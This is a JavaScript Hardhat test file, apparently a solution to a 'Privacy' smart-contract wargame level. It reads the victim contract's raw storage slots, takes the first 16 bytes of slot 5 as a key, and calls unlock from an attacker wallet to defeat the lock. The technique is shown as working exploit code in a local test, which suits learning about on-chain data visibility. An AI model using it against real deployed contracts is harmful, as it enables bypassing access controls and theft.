const {
    time,
    loadFixture,
    getStorageAt
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const hre = require("hardhat");
import Web3 from "web3";

const NAME = "Privacy";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        let arg1 = ethers.utils.randomBytes(32);
        let arg2 = ethers.utils.randomBytes(32);
        let arg3 = ethers.utils.randomBytes(32);
        let data = [arg1, arg2, arg3];
        //console.log(data);
        const victimContract = await VictimFactory.deploy(data);

        return { owner, victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let owner, victimContract, attackerWallet, attackerContract;
        before(async function () {
            ({ owner, victimContract, attackerWallet } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            hre.web3 = new Web3(hre.network.provider);


            //solc contracts/privacy/Privacy.sol --storage-layout --pretty-json
            let value0 = await hre.web3.eth.getStorageAt(victimContract.address, 0);
            console.log(value0);
            let value1 = await hre.web3.eth.getStorageAt(victimContract.address, 1);
            console.log(value1);
            let value2 = await hre.web3.eth.getStorageAt(victimContract.address, 2);
            console.log(value2);
            let value3 = await hre.web3.eth.getStorageAt(victimContract.address, 3);
            console.log(value3);
            let value4 = await hre.web3.eth.getStorageAt(victimContract.address, 4);
            console.log(value4);
            let value5 = await hre.web3.eth.getStorageAt(victimContract.address, 5);
            console.log(value5);

            let offset = 2 + 16 * 2; //0x + 16 bytes
            let key = value5.slice(0, offset); //string slice
            console.log(key);
            await victimContract.connect(attackerWallet).unlock(key);
        });

        after(async function () {
            expect(await victimContract.locked.call()).to.be.equal(false);
        });
    });
});